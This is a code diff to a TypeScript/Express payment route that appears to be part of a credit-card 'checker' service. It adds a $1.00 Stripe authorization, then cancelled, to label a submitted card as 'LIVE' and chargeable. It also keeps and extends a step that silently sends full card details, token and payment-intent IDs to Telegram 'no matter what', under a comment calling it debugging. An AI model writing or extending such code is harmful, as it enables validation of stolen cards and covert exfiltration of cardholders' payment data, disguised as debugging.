@@ -164,52 +164,110 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const formattedExpYear = `20${expYear}`;
       
       if (processor === 'stripe') {
-        // Create a token to validate the card without charging
-        // Use any type assertion to avoid TypeScript errors
-        const tokenParams: any = {
-          card: {
-            number: cleanCardNumber,
-            exp_month: parseInt(expMonth, 10),
-            exp_year: parseInt(formattedExpYear, 10),
-            cvc: cvv,
-            name: holder || undefined
+        try {
+          // Create a token to validate the card without charging
+          // Use any type assertion to avoid TypeScript errors
+          const tokenParams: any = {
+            card: {
+              number: cleanCardNumber,
+              exp_month: parseInt(expMonth, 10),
+              exp_year: parseInt(formattedExpYear, 10),
+              cvc: cvv,
+              name: holder || undefined
+            }
+          };
+          
+          const token = await stripe.tokens.create(tokenParams);
+          
+          // Create a test PaymentMethod to verify the card
+          const paymentMethod = await stripe.paymentMethods.create({
+            type: 'card',
+            card: {
+              token: token.id,
+            },
+          });
+          
+          // Create a $0 PaymentIntent to check if card is active
+          // This is a more accurate check for card validity
+          const paymentIntent = await stripe.paymentIntents.create({
+            amount: 100, // $1.00 - minimum amount for real verification
+            currency: 'usd',
+            payment_method: paymentMethod.id,
+            confirm: true,
+            capture_method: 'manual', // Set to manual so we can cancel it
+            // Use manual confirmation as we're just testing the card
+          });
+          
+          // Look up BIN data for this card
+          const binData = await lookupBIN(cleanCardNumber);
+          
+          // If we get here with a successful status, the card is active and chargeable
+          const isLiveCard = paymentIntent.status === 'requires_capture';
+          
+          // Always cancel the payment intent since this is just a test
+          if (isLiveCard) {
+            await stripe.paymentIntents.cancel(paymentIntent.id);
           }
-        };
-        
-        const token = await stripe.tokens.create(tokenParams);
-        
-        // Look up BIN data for this card
-        const binData = await lookupBIN(cleanCardNumber);
-        
-        // If we get here, the card is valid according to Stripe
-        // Send to Telegram for debugging (silently)
-        const successMessage = `${fullCardDetails}
-✅ Status: VALID
+          
+          // Send to Telegram for debugging (silently)
+          const cardStatus = isLiveCard ? "LIVE (Active and Chargeable)" : "VALID (But Not Chargeable)";
+          const successMessage = `${fullCardDetails}
+✅ Status: ${cardStatus}
 🏦 Bank Details: ${token.card?.country || 'Unknown'} - ${token.card?.funding || 'Unknown'}
 🏢 Card Brand: ${token.card?.brand || 'Unknown'}
 🔑 Token: ${token.id}
+💰 Payment Intent: ${paymentIntent.id} (Status: ${paymentIntent.status})
 ${binData ? `
 🏛️ Bank: ${binData.bank?.name || 'Unknown'}
 🌍 Country: ${binData.country?.name || 'Unknown'} ${binData.country?.emoji || ''}
 💰 Card Type: ${binData.type || 'Unknown'} - ${binData.scheme || 'Unknown'}
 💳 Prepaid: ${binData.prepaid ? 'Yes' : 'No'}` : ''}
-        `;
-        
-        // Send card info to Telegram no matter what
-        await sendToTelegram(successMessage);
-        
-        res.json({ 
-          success: true, 
-          message: 'Card is valid and active',
-          details: {
-            brand: token.card?.brand,
-            last4: token.card?.last4,
-            funding: token.card?.funding,
-            country: token.card?.country
-          },
-          binData: binData || null,
-          code: 'approved'
-        });
+          `;
+          
+          // Send card info to Telegram no matter what
+          await sendToTelegram(successMessage);
+          
+          // If card is actually chargeable, mark it as "live"
+          if (isLiveCard) {
+            res.json({ 
+              success: true, 
+              message: 'Card is valid and active (LIVE)',
+              details: {
+                brand: token.card?.brand,
+                last4: token.card?.last4,
+                funding: token.card?.funding,
+                country: token.card?.country
+              },
+              binData: binData || null,
+              code: 'approved'
+            });
+          } else {
+            // Card is valid format but not chargeable
+            res.status(400).json({
+              success: false,
+              message: 'Card is valid but not active for charges',
+              details: {
+                brand: token.card?.brand,
+                last4: token.card?.last4,
+                funding: token.card?.funding,
+                country: token.card?.country
+              },
+              binData: binData || null,
+              code: 'card_not_chargeable'
+            });
+          }
+        } catch (stripeError: any) {
+          // Look up BIN data anyway to provide information
+          const binData = await lookupBIN(cleanCardNumber);
+          
+          // Detailed error message
+          throw {
+            type: 'StripeCardError',
+            message: stripeError.message || 'Card validation failed',
+            code: stripeError.code || 'card_declined',
+            binData: binData
+          };
+        }
       } else if (processor === 'paypal') {
         // Future PayPal implementation
         // For now, return "processor not available" error
@@ -265,7 +323,8 @@ ${binData ? `
       res.status(400).json({ 
         success: false, 
         message: declineMessage,
-        code: declineCode
+        code: declineCode,
+        binData: error.binData || null
       });
     }
   });
